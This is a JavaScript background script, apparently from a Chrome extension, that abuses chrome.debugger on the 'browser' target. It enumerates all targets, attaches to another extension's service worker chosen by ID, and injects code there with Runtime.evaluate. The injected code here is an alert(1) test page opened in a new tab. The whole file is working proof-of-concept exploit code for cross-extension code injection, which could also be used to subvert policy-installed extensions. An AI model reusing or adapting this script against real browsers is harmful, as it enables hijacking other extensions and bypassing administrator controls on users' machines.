
chrome.runtime.onMessage.addListener(async function (msg, sender, sendResponse) {
    if (msg.type === "loadinspectargets") {
        await chrome.debugger.attach({ targetId: "browser" }, '1.3');
        var allTargets = await chrome.debugger.sendCommand({ targetId: 'browser' }, 'Target.getTargets');
        await chrome.debugger.detach({ targetId: 'browser' });
        sendResponse({
            data: allTargets.targetInfos,
            type: 'response'
        });
    }
    if (msg.type === "startinspect") {
        await chrome.debugger.attach({ targetId: 'browser' }, '1.3')
        function chromeTabsScriptFull() {
            var url = URL.createObjectURL(new Blob(["<script>alert(1)</script>"], { type: 'text/html' }));
            chrome.tabs.create({ url: url });
        }
        var id = setInterval(async () => {

            (await chrome.debugger.sendCommand({ targetId: 'browser' }, "Target.getTargets")).targetInfos.forEach(async function (t) {
                console.log(t.type);
                if (t.url.includes('chrome-extension://' + msg.extid) && t.type === "service_worker") {
                    var targetId = t.targetId;
                    var { sessionId } = await chrome.debugger.sendCommand({ targetId: 'browser' }, 'Target.attachToTarget', { targetId, flatten: false })
                    console.log(await chrome.debugger.sendCommand({ targetId: "browser" }, 'Target.sendMessageToTarget', { sessionId, message: JSON.stringify({ id: 999, method: "Runtime.evaluate", params: { expression: `(${chromeTabsScriptFull.toString()})()` } }) }));
                    chrome.debugger.detach({ targetId: 'browser' })
                    sendResponse({
                        "error": null,
                        "data": ""
                    })
                    clearInterval(id)
                }
            })

        }, 200);



    }
    if (msg.type === "cancelinspect") {
        await chrome.debugger.detach({ targetId: 'browser' });
        sendResponse({ error: null, type: 'response', data: {} });
    }
})
